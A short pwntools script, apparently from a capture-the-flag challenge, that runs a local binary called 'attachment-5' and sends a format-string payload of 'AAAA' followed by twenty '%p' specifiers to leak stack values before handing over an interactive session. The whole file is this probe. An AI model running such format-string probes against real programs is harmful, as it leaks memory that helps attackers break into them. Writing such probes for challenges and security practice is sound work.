from pwn import *

io = process("./attachment-5")


payload = b"AAAA" + b"%p " * 20


io.sendline(payload)

io.interactive()
